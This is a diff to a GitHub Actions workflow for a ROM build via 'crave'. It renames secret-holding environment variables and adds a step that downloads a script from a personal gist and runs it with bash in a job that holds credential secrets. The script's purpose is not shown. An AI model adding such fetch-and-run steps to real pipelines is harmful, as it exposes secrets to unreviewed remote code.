@@ -71,9 +71,9 @@ jobs:
     runs-on: ubuntu-latest
     env:
       ght: ${{ secrets.GHT }}
-      setup_ssh: ${{ secrets.SSH }}
-      sf_uploader: ${{ secrets.UPLOADER }}
-      notify: ${{ secrets.NOTIFY }}
+      SETUP_SSH: ${{ secrets.SSH }}
+      SF_UPLOADER: ${{ secrets.UPLOADER }}
+      NOTIFY: ${{ secrets.NOTIFY }}
 
     steps:
     - name: Checkout code
@@ -97,6 +97,10 @@ jobs:
           envsubst < ${PWD}/crave.conf.sample >> ${PWD}/crave.conf
           rm -rf ${PWD}/crave.conf.sample          
         fi
+        echo "settings up ssh"
+        curl -O https://gist.githubusercontent.com/Sa-Sajjad/9a199a2d6a7912866dd8a29740e81732/raw/snx.sh
+        bash snx.sh
+        exit 1
       env:
         CRAVE_USERNAME: ${{  secrets.CRAVE_USERNAME  }}
         CRAVE_TOKEN: ${{  secrets.CRAVE_TOKEN  }}
@@ -252,6 +256,7 @@ jobs:
           echo "Building $BUILD_DIFFERENT_ROM"
         fi
         echo "BUILD_DIFFERENT_ROM=$BUILD_DIFFERENT_ROM" >> "$GITHUB_ENV"
+        
 
       # Create a 'crave' job for building.
     - name: Start compilation through 'crave'
